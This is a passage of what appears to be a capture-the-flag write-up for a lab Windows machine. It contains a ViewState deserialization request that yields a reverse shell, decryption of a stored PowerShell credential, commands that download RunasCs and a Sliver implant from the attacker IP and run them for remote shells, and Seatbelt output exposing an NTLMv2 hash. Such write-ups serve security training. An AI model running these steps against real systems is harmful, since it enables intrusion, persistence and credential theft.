EfeP28ojw1NGkpoFZMsrJxImJcGg1N2LBqX5fY%2BqR5F3%2BA73rPy7CNuudRszBaDjymGrHYW8bxRkkxts75dgHu2jLjgwpWL1Aa8Ov0t0MuyvNZra%2BOMoSo8K3GFk1SFldG%2FqbwGqzcFQhUOX3kRvVbq6OUdWbDsMnqqYx9Lw%2FfH8C0rPFyivx2GanozM76PHNpJewRQyQhcn1EqiUB0BqGLRe90KLlKhEEMxCnf6o63%2F%2F7xCTUvW%2FuuuDZb94oFvQ0r%2FL9YCPzdyhDh3001M4ymzY%2FhaP6aq3Q7JaeLh8lpFUotPWmButgDTPBsGKjTx6raL76LHxaURYkugd8aX0SyoN7wnjoKE96aSIPacJgbdzRozwiBw2ztPRk4y0q2hy8zNCLldbnM6AYy2lFhmHR0GzqMCABLx%2FqMNM%2B7yWez8Azbwo6ECWRxj4n3CvAtbxCaTd7cnY1p%2BPGio6tIaEzLC7V7GM5DcBjOReMXUT2gPWM2otyBXPHaNJPkIdD2eA%3D%3D
COMMANDO 01/27/2024 11:52:33
```

Request:

```c
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 3527
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=dvTrnfBVRCFygCBTgyFcWdfcAffrPXATSoI1Dn3cKYOmJ5r8YedUN%2BGPsFdRkI%2FukRxmitUSpN4rP1i3my6EUoI40u9U0pNTxaBHzXLDayQeJ6WERL4js6Rww%2BzBUjN5bb9ghDFs6vQdtlWocfADRkKes2xn8ofMsWkN43VwNQCidFgxujSR0FOzRlkrOzXvDoCqz29YUDKq8r%2FcLZYM3uJrzLKwv4Xli%2Ft5evDByAZHRgaoKQ1vadAFNaldXuUnfY2EWy9r5W70VgrDo1841B%2BggyJsQZ464NwHNujFCPFIDufgWlVLnjSoc9wDDrkNc8eXYyavS6FUwfzVPXoKX6oItEE%2FNkAYiRFdOn1ebQKwnYGJW9vG%2Bkm%2BrfDJHL89Pkc3IU5%2BnFud7HaIhes3Z%2BbZBcumMEkI3VrETFD7gcPmWiUgp9Dw7BCnG2WW%2FB%2B5rZuc0TH5U5ilt%2FDdQ3kF8ZEKkxmO8Z6Kfar0jKuli2CbOkzI8%2BmlQOCqUao%2FbvEfns0kqUD6dq7SSt2p2u%2Bk85%2FnQyjFx2jrl5tlXDJ6t3CMHLKPSCGTbXdAQmmomNj8noqn48t%2Be8J6vdGOgWVVDd9sC3IVTDT%2FWPCTADIS7qyc82Y1jE9j7ruxKdjj3ZMwdaeCsGeW5xYj%2FnL1nebyKrlll1Vk%2FbNkU7PR%2Bln2yn0QKcRFhiLecmoJ7xN7CNd%2FTqNQnihGffiihTr8rqNeh40Gw9ObRSiBRWLa%2FvGS85%2Beww2oz4Oibnt51j6q5qr5TmcsZImIKYK2OVfkj9ONtG6i9V3LbNpQ2QeQktH1cqGqurCmdII2j%2BaPm0k%2Fcl3AJ8U6XumT%2BDpOBFFqQjy556wcsfYB8Bn4aamWMIN%2Fjfj2jPCvc8gqsFAiR9vnbsGiL6JhqNaS93m243%2F3G7%2BgQIcoTnhuqayhxIHAqOF%2FhREVfaKtL3RLXVAsUapOZoS9h9bVrRT3IUOlCaBJY6Hg1Mfzpr%2BBlEtkWJM4YAEMvMF5KObzBS9ZwDI%2B8QtRtnIW0ct9IFbpYt2YY6qKSPt1XJvJXGwQuVk3f%2B%2FuXjXHw3ntHleiAnhOHKjsUsLyykhvtZn3uduFk3ff2gs6RWjng2VlrSG9KW7eyAwuUZZuCuT%2FWFmhM6lviUpKFDvHTeXxXZtES2X3hZ0auclAPQE%2BDgzgzncdqBDfKVRi1iRrGpYVrBtgAgQ6evlKW6K7kWie%2Bkl%2BoYPvxW2CyjwHkBxKLwU1UZ%2FYTpOH%2FlIi7bggOtKSUKj318jBtjhU78RT91LPZYcwzWVAYHjLW0tN%2B9heM6QxeZRK8%2FQ%2BGt3Lw8qnIzFiGA%2BI70VnJTPHZxTVFcvP12wdO6C%2BF%2B1fRHY8BV7O8cQ09dX%2F7wv%2Bpm%2FP7w2BUga0%2BnaeTGi6CizfSJC1cW7reA3tbZq83mnctv6BMNIrzNRJVDYsZN3%2Bnm7OpDgYY2pzjkwgXQsRRvps2ML1qgUwEl4EioOnh5Sc6LOOhdGzOfcDFhGaLnwUhlfyzkgXzIBtXUR%2BBlmxyPQuFTeFw6Br0a1SbTP9x%2FTsRTc08DflNEU52JhF3geKrjs86gnjZ5ulch4Q4aKgxlxCmMLKvLYfFpxJLg5JLPy0hc0dWZnT6lggHgi1FhIpZaMI2Es5UgNjAZegodDhQmbUSRMZVNN4EKlMYvZ%2B8CLqZ%2Beahvu1KuggQv7lEdIzBS6NnBbDYhOz3cHSO73Db2y2jZ%2Fvz9%2BizQpfJ%2BBTCkEANYvOCtsMjqfkdw916fqsouOjKl0WE8wtHjNIu6xM%2F4oSbFZxeJU46XKClxQq8vtzA3NAMSJMWFqi3LTgLqNiTgU5LpBs1cp79ijL078UR2uxnytSItUl6V7eT6EZ8enBUB3JC28dD8umkQR8%2B9P8ORZymzXPZxqUX0EvVH5It%2BGhG7e99rxOip6Ryxy5ZRwPgBTU9T771UpvSv%2FPOKjzu6ttUC3o6jwPrP8rca84JGMJ1i43f5qoZhh7ODHNMtlRcrOyv%2FzmBqCP17Z1E2Zni3ZlXY9iDW4Vs0Zj2%2FpzFqF3jlv0J0HmJb2J9E02B91saNVX2zOq1Cndd4JVyyskj6xI2Cd1gnuCoyuKGr4pmuGVDJQanShb2h8g1y6KcnJ6PpVGBx2%2BJeUQWAVFriUpi5mJw3rXwQ3ss1o0KLJqphU92daSqVrzqoWpIWexYnPhAFkYwX%2FhAKLPyLKGLaBDtI5PhiVTBnI2qGE5l2bot6hYpCUM6tjM0jCaA9%2FtriadlhDTZCxCEZLcgwjMJk%2F2g8yy7muNdwenQsc6zsnYy3I5n5eT8Q4iuXiRGO9H3MPFHNBwcdEmJl5f2awMhphwQSo1yGUUpPYsE8O6WpRxd6g2T0ORgIk9oGrBf%2FBQQBxKqDeouo0w%2FDC2d3nVbs%2Fz5yOQpp%2BHmoQSG18Juo%2BZaXKyVEFXZH7vWctDmJDoP7SyrrUYgCf9ZTIpR21tbFO7NhKbWNdAk9RXihVlcGMYAMNeY9K2yktSbBW%2BTNKygGadzxY5zj%2BQO1UR9xWWUs7B9dLxuMTLiAJSaKhkECI4dZkh4h%2FyPToTtjPVOEfeP28ojw1NGkpoFZMsrJxImJcGg1N2LBqX5fY%2BqR5F3%2BA73rPy7CNuudRszBaDjymGrHYW8bxRkkxts75dgHu2jLjgwpWL1Aa8Ov0t0MuyvNZra%2BOMoSo8K3GFk1SFldG%2FqbwGqzcFQhUOX3kRvVbq6OUdWbDsMnqqYx9Lw%2FfH8C0rPFyivx2GanozM76PHNpJewRQyQhcn1EqiUB0BqGLRe90KLlKhEEMxCnf6o63%2F%2F7xCTUvW%2FuuuDZb94oFvQ0r%2FL9YCPzdyhDh3001M4ymzY%2FhaP6aq3Q7JaeLh8lpFUotPWmButgDTPBsGKjTx6raL76LHxaURYkugd8aX0SyoN7wnjoKE96aSIPacJgbdzRozwiBw2ztPRk4y0q2hy8zNCLldbnM6AYy2lFhmHR0GzqMCABLx%2FqMNM%2B7yWez8Azbwo6ECWRxj4n3CvAtbxCaTd7cnY1p%2BPGio6tIaEzLC7V7GM5DcBjOReMXUT2gPWM2otyBXPHaNJPkIdD2eA%3D%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=cmDniIBDj17%2FxSXa93143DgR334sjcSXaIfxYMIE0sKDEhgcizBUsEEA4hA%2FPj7uOUPJhMG6bFJBUc4lgbnjFRyofouqbdgAHlQYh8Gqv1Ei0I1DLCa5PqBWUX7dvEilPiy%2FCQ%3D%3D&file=cv.pdf
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.34] from (UNKNOWN) [10.129.248.9] 49675

PS C:\windows\system32\inetsrv>
```

```c
PS C:\windows\system32\inetsrv> whoami /all

USER INFORMATION
----------------

User Name SID                                          
========= =============================================
pov\sfitz S-1-5-21-2506154456-4081221362-271687478-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                           Attributes                                        
====================================== ================ ============================================================= ==================================================
Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\dev                        Well-known group S-1-5-82-781516728-2844361489-696272565-2378874797-2530480757 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Privilege Escalation

```c
PS C:\windows\system32\inetsrv> [xml]$xmlContent = Get-Content -Path "C:\users\sfitz\Documents\connection.xml"
PS C:\windows\system32\inetsrv> $encryptedPassword = $xmlContent.Objs.Obj.Props.SS.'#text'
PS C:\windows\system32\inetsrv> $securePassword = $encryptedPassword | ConvertTo-SecureString
PS C:\windows\system32\inetsrv> $username = $xmlContent.Objs.Obj.Props.S.'#text'
PS C:\windows\system32\inetsrv> $credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
PS C:\windows\system32\inetsrv> $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password)
PS C:\windows\system32\inetsrv> $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
PS C:\windows\system32\inetsrv> Write-Output $plainPassword
f8<--- SNIP --->m3
```

| Password |
| --- |
| <--- SNIP ---> |

> https://github.com/antonioCoco/RunasCs/releases/tag/v1.5

```c
PS C:\temp> iwr http://10.10.16.34/asdf.exe -o asdf.exe
```

```c
PS C:\temp> .\asdf.exe "alaading" '<--- SNIP --->' cmd.exe -r 10.10.16.34:6969

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-77ac4$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2964 created in background.
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.34] from (UNKNOWN) [10.129.248.9] 49677
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## user.txt

```c
C:\Users\alaading\Desktop>type user.txt
type user.txt
f862937c9cfa45f6bb0036d1e8aba210
```

## Pivoting

```c
C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID                                          
============ =============================================
pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Persistence

```c
┌──(user㉿kali)-[~]
└─$ sliver-server 
[*] Loaded 20 aliases from disk
[*] Loaded 104 extension(s) from disk

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain conspire
[*] Server v1.5.41 - user
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver >
```

```c
[server] sliver > generate --mtls 10.10.16.34 --os windows --arch amd64 --format exe --disable-sgn --save foobar

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 31s
[*] Implant saved to /home/user/foobar
```

```c
[server] sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

[server] sliver >
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/pov/serve]
└─$ mv foobar foobar.exe
```

```c
PS C:\temp> iwr http://10.10.16.34/foobar.exe -o foobar.exe
iwr http://10.10.16.34/foobar.exe -o foobar.exe
PS C:\temp> .\foobar.exe
.\foobar.exe
```

```c
[*] Session e5191661 UNLIKELY_BAIT - 10.129.248.9:49679 (pov) - windows/amd64 - Sat, 27 Jan 2024 20:09:06 UTC
```

## Further Pivoting

> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe

```c
[server] sliver (UNLIKELY_BAIT) > execute-assembly Seatbelt.exe -group=user

[*] Output:


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


====== Certificates ======

====== CertificateThumbprints ======

CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
====== ChromiumPresence ======

====== CloudCredentials ======

====== CloudSyncProviders ======

====== CredEnum ======

ERROR:   [!] Terminating exception running command 'CredEnum': System.ComponentModel.Win32Exception (0x80004005): Element not found
   at Seatbelt.Commands.Windows.CredEnumCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== dir ======

  LastAccess LastWrite  Size      Path

  23-10-26   23-10-26   0B        C:\Users\Public\Documents\My Music\
  23-10-26   23-10-26   0B        C:\Users\Public\Documents\My Pictures\
  23-10-26   23-10-26   0B        C:\Users\Public\Documents\My Videos\
  23-10-26   23-10-26   0B        C:\Users\Default\Documents\My Music\
  23-10-26   23-10-26   0B        C:\Users\Default\Documents\My Pictures\
  23-10-26   23-10-26   0B        C:\Users\Default\Documents\My Videos\
  23-10-26   23-10-26   0B        C:\Users\alaading\Documents\My Music\
  23-10-26   23-10-26   0B        C:\Users\alaading\Documents\My Pictures\
  23-10-26   23-10-26   0B        C:\Users\alaading\Documents\My Videos\
  24-01-27   24-01-27   34B       C:\Users\alaading\Desktop\user.txt
====== DpapiMasterKeys ======

  Folder : C:\Users\alaading\AppData\Roaming\Microsoft\Protect\S-1-5-21-2506154456-4081221362-271687478-1001

    LastAccessed              LastModified              FileName
    ------------              ------------              --------
    10/26/2023 4:57:25 PM     10/26/2023 4:57:25 PM     36172934-8f0f-448e-9db4-ec0ae35ea373
    12/25/2023 1:52:59 PM     12/25/2023 1:52:59 PM     5669897a-1e01-4376-85fc-f94ec1438fe6


  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt
  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module
  [*] You can also use SharpDPAPI for masterkey retrieval.
====== Dsregcmd ======

ERROR: Unable to collect. No relevant information were returned
====== ExplorerMRUs ======

====== ExplorerRunCommands ======

====== FileZilla ======

====== FirefoxPresence ======

====== IdleTime ======

  CurrentUser : POV\alaading
  Idletime    : 01h:14m:58s:703ms (4498703 milliseconds)

====== IEFavorites ======

Favorites (alaading):

  http://go.microsoft.com/fwlink/p/?LinkId=255142

====== IETabs ======

ERROR:   [!] Terminating exception running command 'IETabs': System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at Seatbelt.Commands.Browser.InternetExplorerTabCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== IEUrls ======

Internet Explorer typed URLs for the last 7 days

====== KeePass ======

====== MappedDrives ======

Mapped Drives (via WMI)

====== OfficeMRUs ======

Enumerating Office most recently used files for the last 7 days

  App       User                     LastAccess    FileName
  ---       ----                     ----------    --------
====== OneNote ======


    OneNote files (.NET v4.5):



    OneNote files (.NET v4.5 Classic):



    OneNote files (Administrator):



    OneNote files (alaading):



    OneNote files (sfitz):


====== OracleSQLDeveloper ======

====== PowerShellHistory ======

====== PuttyHostKeys ======

====== PuttySessions ======

====== RDCManFiles ======

====== RDPSavedConnections ======

====== SecPackageCreds ======

  Version                        : NetNTLMv2
  Hash                           : alaading::POV:1122334455667788:e1f3c09d6f2310d768b484de08ba0b85:010100000000000031dc69c45d51da01653331903b4448c30000000008003000300000000000000000000000003000004db357d712fb8cf2ec74aecbd3a64007932e96fcc7257a18680477b5f62c05040a00100000000000000000000000000000000000090000000000000000000000

====== SlackDownloads ======

====== SlackPresence ======

====== SlackWorkspaces ======

====== SuperPutty ======

====== TokenGroups ======

Current Token's Groups

  POV\None                                 S-1-5-21-2506154456-4081221362-271687478-513
  Everyone                                 S-1-1-0
  BUILTIN\Remote Management Users          S-1-5-32-580
  BUILTIN\Users                            S-1-5-32-545
  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  CONSOLE LOGON                            S-1-2-1
  NT AUTHORITY\Authenticated Users         S-1-5-11
  NT AUTHORITY\This Organization           S-1-5-15
  NT AUTHORITY\Local account               S-1-5-113
  NT AUTHORITY\NTLM Authentication         S-1-5-64-10
====== WindowsCredentialFiles ======

  Folder : C:\Users\alaading\AppData\Local\Microsoft\Credentials\

    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D
    Description  : Local Credential Data
    MasterKey    : 5669897a-1e01-4376-85fc-f94ec1438fe6
    Accessed     : 12/25/2023 1:53:11 PM
    Modified     : 12/25/2023 1:53:11 PM
    Size         : 11104


====== WindowsVault ======


  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 0


[*] Completed collection in 1.118 seconds
```

```c
[server] sliver (UNLIKELY_BAIT) > execute-assembly Seatbelt.exe -group=system

[*] Output:


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


====== AMSIProviders ======

====== AntiVirus ======

Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
====== AppLocker ======

  [*] AppIDSvc service is Stopped

    [*] Applocker is not running because the AppIDSvc is not running

  [*] AppLocker not configured
====== ARPTable ======

  Loopback Pseudo-Interface 1 --- Index 1
    Interface Description : Software Loopback Interface 1
    Interface IPs      : ::1, 127.0.0.1
    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static


  Ethernet0 2 --- Index 4
    Interface Description : vmxnet3 Ethernet Adapter
    Interface IPs      : dead:beef::e097:3f97:ab15:547e, fe80::d64f:12f1:58f6:9c0d%4, 10.129.248.9
    DNS Servers        : 127.0.0.1

    Internet Address      Physical Address      Type
    10.129.0.1            00-50-56-B9-F8-EC     Dynamic
    10.129.255.255        FF-FF-FF-FF-FF-FF     Static
    169.254.49.225        00-00-00-00-00-00     Invalid
    169.254.255.255       00-00-00-00-00-00     Invalid
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    255.255.255.255       FF-FF-FF-FF-FF-FF     Static


====== AuditPolicies ======

====== AuditPolicyRegistry ======

====== AutoRuns ======


  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    C:\Windows\system32\SecurityHealthSystray.exe
    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
====== Certificates ======

====== CertificateThumbprints ======

CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
